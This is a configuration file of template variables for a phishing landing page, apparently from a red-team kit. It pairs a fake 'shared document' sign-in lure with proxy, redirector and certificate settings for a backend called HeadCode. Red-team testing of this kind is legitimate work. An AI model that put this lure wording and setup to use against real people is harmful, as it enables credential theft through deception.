# Landing page template variables
# Edit these values for your engagement, then run: ./setup.sh

# Page title (browser tab)
PAGE_TITLE="Secure Document Portal"

# Main heading on the page
HEADING="A document has been shared with you"

# Body message (supports basic text, keep it short)
MESSAGE="Your organization has shared a document that requires authentication. Click below to securely sign in and access the shared content."

# Button text
BUTTON_TEXT="Sign in to view document"

# Footer text
FOOTER="Protected by your organization's security policy"

# Path that proxies to HeadCode (must match HeadCode --path flag)
LURE_PATH="/lure"

# HeadCode server address (where Apache proxies to)
HEADCODE_BACKEND="http://127.0.0.1:8080"

# SSL certificate paths (from certbot or your own certs)
SSL_CERT="/etc/letsencrypt/live/__DOMAIN__/fullchain.pem"
SSL_KEY="/etc/letsencrypt/live/__DOMAIN__/privkey.pem"

# Server name (your CDN or redirector domain)
SERVER_NAME="_"
